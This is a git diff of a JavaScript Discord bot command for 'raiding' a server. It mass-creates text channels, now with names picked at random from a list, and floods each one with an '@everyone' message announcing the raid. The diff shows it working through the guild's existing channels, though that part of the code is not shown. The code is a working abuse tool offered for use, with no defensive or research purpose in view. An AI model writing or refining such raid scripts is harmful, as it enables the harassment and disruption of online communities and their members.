@@ -9,9 +9,9 @@ module.exports = {
     // Defaults
     const defaultMessage = `YOUR SERVER HAS BEEN RAIDED BY ${interaction.client.user} !!! \n @everyone`;
     const defaultSpamAMT = 10;
-    const defaultChannelName = 'RAID';
+    const defaultChannelNames = ['HAHA', 'LOL', 'EMOJI']; // Default list of channel names
     const defaultErrorMessage = 'An internal error has occurred, please check console.';
-    const defaultNumberOfMessagesPerChannel = 5; // Change this to the desired number of messages per channel
+    const defaultNumberOfMessagesPerChannel = 5;
 
     const throwInteractionError = (errorMessage) => {
       interaction.reply({ content: errorMessage, ephemeral: true });
@@ -19,8 +19,10 @@ module.exports = {
 
     let spamAMTbyUser = interaction.options.getInteger('message-amount') || defaultSpamAMT;
     let userMessage = interaction.options.getString('raid-message') || defaultMessage;
-    let userChannelName = interaction.options.getString('channel-name') || defaultChannelName;
-    let numberOfMessagesPerChannel = interaction.options.getInteger('message-amt-per-channel') || defaultNumberOfMessagesPerChannel
+    let userChannelNames = interaction.options.getString('channel-names'); // User-provided channel names
+
+    // If user did not provide channel names, use default list
+    userChannelNames = userChannelNames ? userChannelNames.split(',') : defaultChannelNames;
 
     try {
       const channels = Array.from(guild.channels.cache.values());
@@ -33,20 +35,20 @@ module.exports = {
 
     try {
       const newChannel = await guild.channels.create({
-        name: `${userChannelName}`,
+        name: `${userChannelNames[Math.floor(Math.random() * userChannelNames.length)]}`,
         type: ChannelType.GuildText,
       });
 
       await Promise.all(
         Array.from({ length: spamAMTbyUser }, async (_, i) => {
           const duplicateChannel = await guild.channels.create({
-            name: `${userChannelName}-${i + 1}`,
+            name: `${userChannelNames[Math.floor(Math.random() * userChannelNames.length)]}`,
             type: ChannelType.GuildText,
             parent: newChannel.parent,
           });
 
           await Promise.all(
-            Array.from({ length: numberOfMessagesPerChannel }, async () => {
+            Array.from({ length: defaultNumberOfMessagesPerChannel }, async () => {
               try {
                 await duplicateChannel.send(userMessage);
               } catch (error) {
